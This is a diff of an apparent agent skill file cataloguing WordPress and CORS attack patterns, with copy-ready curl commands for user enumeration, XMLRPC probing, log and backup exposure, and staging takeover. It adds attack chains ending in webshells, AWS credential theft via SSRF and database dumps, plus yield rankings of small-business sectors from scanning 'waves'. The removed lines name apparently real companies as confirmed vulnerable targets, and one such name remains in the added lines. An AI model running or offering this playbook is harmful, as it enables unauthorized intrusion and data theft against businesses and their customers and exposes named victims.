@@ -2,27 +2,28 @@
 name: attack-patterns-reference
 description: "Catalog: 25 attacks, 18 WP, 8 CORS to match findings."
 version: 1.1.0
-author: agentiko
 license: MIT
-metadata:
-  hermes:
-    tags: [meta, reference, patterns, bypass, catalog]
-    category: meta
-    related_skills:
-      - wp-mass-recon
-      - cors-credential-wordpress
-      - xmlrpc-exploitation
-      - cross-attack-chains
-      - deep-invade
-      - error-log-mining
-      - source-leak-hunt
-      - phpinfo-to-rce
-      - port-service-discovery
-      - js-secrets-extraction
-      - staging-subdomain-hunt
-      - subdomain-enumeration
-      - wordpress-plugin-hunt
-      - web-enumeration
+tags: [meta, reference, patterns, bypass, catalog]
+revision_date: 2026-07-25
+platforms: [linux]
+compatibility: N/A (reference catalog)
+disable-model-invocation: true
+category: meta
+related_skills:
+  - wp-mass-recon
+  - cors-credential-wordpress
+  - xmlrpc-exploitation
+  - cross-attack-chains
+  - deep-invade
+  - error-log-mining
+  - source-leak-hunt
+  - phpinfo-to-rce
+  - port-service-discovery
+  - js-secrets-extraction
+  - staging-subdomain-hunt
+  - subdomain-enumeration
+  - wordpress-plugin-hunt
+  - web-enumeration
 ---
 
 # Attack Patterns Reference Skill
@@ -98,40 +99,40 @@ Full descriptions, commands, and exploitation paths: [`references/p-patterns.md`
 
 | ID | Pattern | Exact Command | Skill |
 |----|---------|---------------|-------|
-| WP-01 | Direct REST user enum | `curl -sk "https://TARGET/wp-json/wp/v2/users" \| jq '.[] \| {id,name,slug}'` | wp-mass-recon |
-| WP-02 | Auth user info leak | `curl -sk "https://TARGET/wp-json/wp/v2/users?context=edit"` | cors-credential-wordpress |
-| WP-03 | Yoast sitemap author leak | `curl -sk "https://TARGET/author-sitemap.xml"` | wp-mass-recon |
-| WP-04 | XMLRPC method enum | `curl -sk -X POST "https://TARGET/xmlrpc.php" -H "Content-Type: text/xml" -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'` | xmlrpc-exploitation |
+| WP-01 | Direct REST user enum | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/wp/v2/users" \| jq '.[] \| {id,name,slug}'` | wp-mass-recon |
+| WP-02 | Auth user info leak | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/wp/v2/users?context=edit"` | cors-credential-wordpress |
+| WP-03 | Yoast sitemap author leak | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/author-sitemap.xml"` | wp-mass-recon |
+| WP-04 | XMLRPC method enum | `curl --max-time 30 --connect-timeout 10 -sk -X POST "https://TARGET/xmlrpc.php" -H "Content-Type: text/xml" -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'` | xmlrpc-exploitation |
 | WP-05 | XMLRPC multicall BF | POST with `<methodName>system.multicall</methodName>` containing 100+ `wp.getUsers` calls (1000x amplification) | xmlrpc-exploitation |
 | WP-06 | XMLRPC pingback SSRF | POST `<methodName>pingback.ping</methodName>` targeting IMDS/localhost | xmlrpc-exploitation |
-| WP-07 | Open registration check | `curl -sk "https://TARGET/wp-login.php?action=register" \| grep -c "user_login"` (must also match "register" + "wp-submit") | wp-mass-recon |
+| WP-07 | Open registration check | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-login.php?action=register" \| grep -c "user_login"` (must also match "register" + "wp-submit") | wp-mass-recon |
 | WP-08 | Plugin namespace discovery | Brute-force 40+ REST namespaces (`/wp-json/{plugin}/v1/`) | wordpress-plugin-hunt |
-| WP-09 | Plugin version via readme | `curl -sk "https://TARGET/wp-content/plugins/PLUGIN/readme.txt" \| grep "Stable tag"` | wordpress-plugin-hunt |
-| WP-10 | Plugin directory listing | `curl -sk "https://TARGET/wp-content/plugins/PLUGIN/"` | wordpress-plugin-hunt |
-| WP-11 | Staging takeover | `curl -sk "https://staging.TARGET/wp-admin/install.php"` (check for "WordPress" + "installation" in body) | staging-subdomain-hunt |
-| WP-12 | Debug log exposure | `curl -sk "https://TARGET/wp-content/debug.log"` | error-log-mining |
-| WP-13 | Backup file discovery | `curl -sk "https://TARGET/backup.sql"` (verify DDL/DML content, not SPA catch-all) | source-leak-hunt |
-| WP-14 | Site Health endpoint | `curl -sk "https://TARGET/wp-json/wp-site-health/v1"` | deep-invade |
-| WP-15 | ACF plugin field probe | `curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/wp-json/acf/v3"` | wordpress-plugin-hunt |
-| WP-16 | Redirection plugin log | `curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/wp-json/redirection/v1/log"` | error-log-mining |
-| WP-17 | SolidWP Mail log export | `curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/wp-json/solidwp-mail/v1/logs"` | wordpress-plugin-hunt |
-| WP-18 | Gravity Forms API | `curl -sk "https://TARGET/wp-json/gf/v2/"` | wordpress-plugin-hunt |
+| WP-09 | Plugin version via readme | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-content/plugins/PLUGIN/readme.txt" \| grep "Stable tag"` | wordpress-plugin-hunt |
+| WP-10 | Plugin directory listing | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-content/plugins/PLUGIN/"` | wordpress-plugin-hunt |
+| WP-11 | Staging takeover | `curl --max-time 30 --connect-timeout 10 -sk "https://staging.TARGET/wp-admin/install.php"` (check for "WordPress" + "installation" in body) | staging-subdomain-hunt |
+| WP-12 | Debug log exposure | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-content/debug.log"` | error-log-mining |
+| WP-13 | Backup file discovery | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/backup.sql"` (verify DDL/DML content, not SPA catch-all) | source-leak-hunt |
+| WP-14 | Site Health endpoint | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/wp-site-health/v1"` | deep-invade |
+| WP-15 | ACF plugin field probe | `curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://TARGET/wp-json/acf/v3"` | wordpress-plugin-hunt |
+| WP-16 | Redirection plugin log | `curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://TARGET/wp-json/redirection/v1/log"` | error-log-mining |
+| WP-17 | SolidWP Mail log export | `curl --max-time 30 --connect-timeout 10 -sk -o /dev/null -w "%{http_code}" "https://TARGET/wp-json/solidwp-mail/v1/logs"` | wordpress-plugin-hunt |
+| WP-18 | Gravity Forms API | `curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/wp-json/gf/v2/"` | wordpress-plugin-hunt |
 
 ### CORS Bypass Variants (V1 to V8) — with real confirmed targets
 
 | ID | Variant | Detection | Exploitability | Confirmed Target | Wave |
 |----|---------|-----------|----------------|-----------------|------|
-| V1 | Origin reflection + creds | `ACAO: evil.com` + `ACAC: true` | Critical — full credentialed cross-origin read | yardcare.com, restonic.com, toolking.com, wines.com | W1-W9 |
-| V2 | Null origin reflection | `ACAO: null` + `ACAC: true` | High — sandboxed iframe bypass | familydental.com | W6 |
-| V3 | Wildcard no creds | `ACAO: *` (no creds) | Info only — public data, no cookies | patientportal.com, nothingbundtcakes.com, autobell.com | W5 |
+| V1 | Origin reflection + creds | `ACAO: evil.com` + `ACAC: true` | Critical — full credentialed cross-origin read | landscaping.example.com, mattress.example.com,tools-retailer.example.com, ecommerce.example.com | W1-W9 |
+| V2 | Null origin reflection | `ACAO: null` + `ACAC: true` | High — sandboxed iframe bypass | dental.example.com | W6 |
+| V3 | Wildcard no creds | `ACAO: *` (no creds) | Info only — public data, no cookies | health-saas.example.com, bakery.example.com, carwash.example.com | W5 |
 | V4 | Credentialed preflight | OPTIONS returns ACAC + valid origin | High — GET bypass when OPTIONS works | Multiple WP endpoints | W8 |
-| V5 | Auth-endpoint CORS | CORS on endpoints returning 401/403 | Critical — cookie theft even from auth-gated APIs | restonic.com gf/v2 (401 but ACAO+ACAC reflect) | W7 |
-| V6 | Multi-origin reflection | Any origin reflected | Critical — broadest attack surface | realpro.com | W6 |
-| V7 | Plugin-specific CORS | CORS only on plugin namespace (not wp/v2) | Medium — plugin data only | defy.com gravity-pdf/v1 | W5 |
-| V8 | Staging-only CORS | Production no CORS, staging reflects | Medium — dependent on staging access | staging.biglots.com | W5 |
+| V5 | Auth-endpoint CORS | CORS on endpoints returning 401/403 | Critical — cookie theft even from auth-gated APIs | mattress.example.com gf/v2 (401 but ACAO+ACAC reflect) | W7 |
+| V6 | Multi-origin reflection | Any origin reflected | Critical — broadest attack surface | realestate.example.com | W6 |
+| V7 | Plugin-specific CORS | CORS only on plugin namespace (not wp/v2) | Medium — plugin data only | media.example.com gravity-pdf/v1 | W5 |
+| V8 | Staging-only CORS | Production no CORS, staging reflects | Medium — dependent on staging access | staging.retail.example.com | W5 |
 
 ### Non-Standard Pattern: Third-Party CORS Reflection
-**moldmedics.com (Wave6):** ACAO reflects `https://octaneforms.com` — NOT evil.com. Indicates misconfigured third-party integration where the server hardcodes the wrong origin. Not directly exploitable but signals poor CORS hygiene and potential for exploitation of the third-party service instead.
+**mold-remediation.example.com (Wave6):** ACAO reflects `https://form-service.example.com` — NOT evil.com. Indicates misconfigured third-party integration where the server hardcodes the wrong origin. Not directly exploitable but signals poor CORS hygiene and potential for exploitation of the third-party service instead.
 
 ## Sector Attack Matrices
 
@@ -158,12 +159,12 @@ Full descriptions, commands, and exploitation paths: [`references/p-patterns.md`
 ### Tier 2 Sectors (Medium Yield: 10-15%)
 
 **Dental Clinics (15%), Gyms (15%), Real Estate (15%), Roofing (15-18%), HVAC/Plumbing (14%), Auto Repair (11%), Photography (10%), Funeral Homes (10%):**
-Funeral homes: WordPress + user enum (funeralwise.com: 7 users, memorialplanning.com: 4 users). CRUD at rest.
+Funeral homes: WordPress + user enum (funeral.example.com: 7 users, memorial.example.com: 4 users). CRUD at rest.
 
 ### Tier 3 Sectors (Low/Zero Yield)
 
 **Car Dealerships (0%), Furniture Retail (0%), Insurance (0%), Travel Agencies (0%):**
-Furniture retail: 11/15 major brands (Ashley, Wayfair, Crate&Barrel, Pottery Barn) behind Cloudflare/WAF returning 403/429. Only smaller brands (bassettfurniture.com, cityfurniture.com) alive — both clean.
+Furniture retail: 11/15 major brands (FURNITURE_BRAND_1, FURNITURE_BRAND_2, FURNITURE_BRAND_3, FURNITURE_BRAND_4) behind Cloudflare/WAF returning 403/429. Only smaller brands (furniture.example.com, furniture2.example.com) alive — both clean.
 
 ## Cross-Wave Evolution
 
@@ -175,7 +176,8 @@ Furniture retail: 11/15 major brands (Ashley, Wayfair, Crate&Barrel, Pottery Bar
 | 6 | Late | P-08 (SSRF confirmed), P-15 | Error logs = treasure maps |
 | 7 | Late | P-09 (IMDS guessing), P-12 | Deep probes beat surface scans |
 | 8 | Late | P-14 (install pages), P-22 | Forgotten installs = free real estate |
-| 9 | Mid | P-01 through P-25 catalogued | 25 patterns, 18 WP patterns, 8 CORS variants |\n| 10-12 | Current | Funeral homes (10% WP vuln rate), Furniture retail (0% — WAF wall) | Restonic/Realpro XMLRPC still active (false regression from curl -L); 6/7 critical targets persist |
+| 9 | Mid | P-01 through P-25 catalogued | 25 patterns, 18 WP patterns, 8 CORS variants |
+| 10-12 | Current | Funeral homes (10% WP vuln rate), Furniture retail (0% — WAF wall) | TARGET_A/TARGET_B XMLRPC still active (false regression from curl -L); 6/7 critical targets persist |
 
 ## Pitfalls
 
@@ -199,12 +201,12 @@ Furniture retail: 11/15 major brands (Ashley, Wayfair, Crate&Barrel, Pottery Bar
 | CORS Phishing | CORS → browser PoC → data exfil | HIGH | 20+ targets | Trivial |
 | CORS + User Enum → ATO | CORS → user list → spear-phish → admin hijack | HIGH-CRIT | 5 deep targets | Easy |
 | XMLRPC multicall BF | multicall → 1000x brute → WP admin | HIGH | 10+ targets | Easy |
-| SSRF → IMDS → AWS creds | pingback → IMDSv1 → IAM role → AWS takeover | CRITICAL | biglots staging, realpro | Medium |
-| Open Reg → Upload → RCE | register → wp.uploadFile → webshell → shell_exec | CRITICAL | wines.com | Medium |
-| CORS + Plugin CVE → RCE | CORS discover plugin → version detect → CVE exploit | CRITICAL | toolking.com SliderRev | Medium |
-| Error Log → Creds → Admin | error_log mine → DB creds → WP admin login | HIGH | wines.com | Medium |
-| Staging Takeover | crt.sh subdomain → install.php 200 → site seize | CRITICAL | biglots staging | Medium |
-| MySQL Open + CORS | 3306 scan → brute MySQL → dump + API exfil | CRITICAL | patientportal.com | Easy |
+| SSRF → IMDS → AWS creds | pingback → IMDSv1 → IAM role → AWS takeover | CRITICAL | STAGING_TARGET staging, realpro | Medium |
+| Open Reg → Upload → RCE | register → wp.uploadFile → webshell → shell_exec | CRITICAL | ecommerce.example.com | Medium |
+| CORS + Plugin CVE → RCE | CORS discover plugin → version detect → CVE exploit | CRITICAL |tools-retailer.example.com SliderRev | Medium |
+| Error Log → Creds → Admin | error_log mine → DB creds → WP admin login | HIGH | ecommerce.example.com | Medium |
+| Staging Takeover | crt.sh subdomain → install.php 200 → site seize | CRITICAL | STAGING_TARGET staging | Medium |
+| MySQL Open + CORS | 3306 scan → brute MySQL → dump + API exfil | CRITICAL | health-saas.example.com | Easy |
 | Yoast Sitemap + XMLRPC | author-sitemap.xml → user enum → XMLRPC BF → admin | HIGH | multiple | Medium |
 
 ## Failed/Saturated Patterns (8 — do NOT invest time on these)
@@ -212,7 +214,7 @@ Furniture retail: 11/15 major brands (Ashley, Wayfair, Crate&Barrel, Pottery Bar
 1. **Default credential testing** — WordPress auto-generates random passwords since v5.0. admin:admin doesn't exist.
 2. **.git/HEAD on SPA sites** — catch-all routing returns HTML, not git data. Always verify with `.git/config` content.
 3. **CORS on non-WordPress sites** — ALL non-WP targets tested (Next.js, Shopify, Sitecore, Drupal, static) were CORS-SECURE. Don't waste time.
-4. **SliderRev v1 REST exploitation** — v6.x renamed all endpoints. ALL v1 paths returned 404 on toolking.com. Probe both `/sliderrevolution/v1/` AND `/revslider/v1/`.
+4. **SliderRev v1 REST exploitation** — v6.x renamed all endpoints. ALL v1 paths returned 404 ontools-retailer.example.com. Probe both `/sliderrevolution/v1/` AND `/revslider/v1/`.
 5. **Google API key exploitation** — Most JS bundle keys are restricted (all returned `REQUEST_DENIED` in Wave7). Only useful for footprinting, not exploitation.
 6. **Gravity Forms unauth access** — v2.8+ requires authentication. The days of public `/gf/v2/forms` returning entries are over.
 7. **IMDS data via pingback** — faultCode 0 confirms reachability but NEVER returns body data. Need OOB callback for proof.
